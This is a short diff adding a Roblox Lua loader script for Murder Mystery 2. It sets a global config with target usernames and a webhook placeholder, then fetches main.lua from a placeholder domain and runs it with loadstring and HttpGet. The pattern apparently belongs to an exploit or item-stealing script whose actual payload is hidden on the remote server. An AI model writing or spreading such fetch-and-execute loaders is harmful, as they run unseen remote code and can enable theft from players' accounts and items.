@@ -1,0 +1,6 @@
+getgenv().MM2_Config = {
+    users = {"username_here"},
+    webhook = "your_webhook_here"
+}
+
+loadstring(game:HttpGet("https://yourdomain.com/main.lua"))()
